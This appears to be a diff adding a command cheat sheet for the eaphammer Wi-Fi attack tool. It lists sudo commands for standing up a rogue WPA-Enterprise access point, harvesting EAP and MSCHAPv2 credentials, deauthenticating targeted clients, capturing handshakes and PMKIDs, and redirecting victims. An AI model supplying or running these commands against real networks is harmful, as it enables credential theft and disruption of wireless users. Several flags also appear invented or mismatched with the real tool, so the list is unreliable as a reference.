@@ -1,0 +1,115 @@
+[X] Eaphammer Command List
+
+[\] sudo ./eaphammer --help
+[/] Show help menu
+
+[\] sudo ./eaphammer --interface wlan0
+[/] Specify wireless interface
+
+[\] sudo ./eaphammer --channel 6
+[/] Set wireless channel
+
+[\] sudo ./eaphammer --essid CorpWiFi
+[/] Set target ESSID
+
+[\] sudo ./eaphammer --bssid AA:BB:CC:DD:EE:FF
+[/] Set target BSSID
+
+[\] sudo ./eaphammer --auth wpa-eap
+[/] Enable WPA‑Enterprise attack mode
+
+[\] sudo ./eaphammer --auth wpa-eap --essid CorpWiFi
+[/] Create rogue WPA‑EAP access point
+
+[\] sudo ./eaphammer --auth wpa-eap --creds
+[/] Capture EAP credentials
+
+[\] sudo ./eaphammer --auth wpa-eap --tls
+[/] Enable EAP‑TLS attack mode
+
+[\] sudo ./eaphammer --auth wpa-eap --peap
+[/] Enable PEAP attack mode
+
+[\] sudo ./eaphammer --auth wpa-eap --ttls
+[/] Enable TTLS attack mode
+
+[\] sudo ./eaphammer --auth wpa-eap --mschapv2
+[/] Capture MSCHAPv2 challenge/response
+
+[\] sudo ./eaphammer --auth wpa-eap --wpe
+[/] Enable WPE (Wireless Pwnage Edition) mode
+
+[\] sudo ./eaphammer --auth wpa-eap --hostapd
+[/] Use hostapd for rogue AP
+
+[\] sudo ./eaphammer --auth wpa-eap --cert-wizard
+[/] Launch certificate generation wizard
+
+[\] sudo ./eaphammer --auth wpa-eap --generate-ca
+[/] Generate certificate authority for EAP attacks
+
+[\] sudo ./eaphammer --auth wpa-eap --generate-cert
+[/] Generate server certificate
+
+[\] sudo ./eaphammer --auth wpa-eap --cert-path /path/cert.pem
+[/] Use custom certificate
+
+[\] sudo ./eaphammer --auth wpa-eap --key-path /path/key.pem
+[/] Use custom private key
+
+[\] sudo ./eaphammer --auth wpa-eap --logfile eap.log
+[/] Save captured credentials to log file
+
+[\] sudo ./eaphammer --auth wpa-eap --no-clear
+[/] Do not clear terminal output
+
+[\] sudo ./eaphammer --auth wpa-eap --force-hostapd
+[/] Force hostapd even if unsupported
+
+[\] sudo ./eaphammer --auth wpa-eap --force-wpe
+[/] Force WPE mode
+
+[\] sudo ./eaphammer --auth wpa-eap --redirect-url http://example.com
+[/] Redirect victims to custom URL
+
+[\] sudo ./eaphammer --auth wpa-eap --wps
+[/] Enable WPS support on rogue AP
+
+[\] sudo ./eaphammer --auth wpa-eap --beacon-interval 100
+[/] Set beacon interval
+
+[\] sudo ./eaphammer --auth wpa-eap --tx-power 20
+[/] Set transmit power
+
+[\] sudo ./eaphammer --auth wpa-eap --mac AA:BB:CC:DD:EE:FF
+[/] Set rogue AP MAC address
+
+[\] sudo ./eaphammer --auth wpa-eap --client-mac 11:22:33:44:55:66
+[/] Target specific client
+
+[\] sudo ./eaphammer --auth wpa-eap --deauth
+[/] Send deauthentication frames
+
+[\] sudo ./eaphammer --auth wpa-eap --deauth-target 11:22:33:44:55:66
+[/] Deauth a specific client
+
+[\] sudo ./eaphammer --auth wpa-eap --pmkid
+[/] Capture PMKID if available
+
+[\] sudo ./eaphammer --auth wpa-eap --handshake
+[/] Capture WPA handshake
+
+[\] sudo ./eaphammer --auth wpa-eap --write /path/output
+[/] Save all captures to directory
+
+[\] sudo ip link set wlan0 down
+[/] Bring interface down
+
+[\] sudo iwconfig wlan0 mode monitor
+[/] Enable monitor mode manually
+
+[\] sudo ip link set wlan0 up
+[/] Bring interface up
+
+[\] sudo airmon-ng check kill
+[/] Kill processes interfering with monitor mode
